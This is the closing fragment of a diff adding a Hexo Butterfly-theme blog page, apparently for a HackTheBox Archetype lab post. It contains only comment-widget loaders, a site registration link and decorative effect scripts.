+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://www.mathming.ltd/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/'
+    this.page.identifier = '/2023/06/03/2023-6-3-lab-hackthebox-Archetype-windowsRCE/'
+    this.page.title = 'lab-hackthebox-Archetype-windowsRCE'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><a href="https://beian.miit.gov.cn/" target="_blank" class="is-center">冀ICP备2021024675号-1</a><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
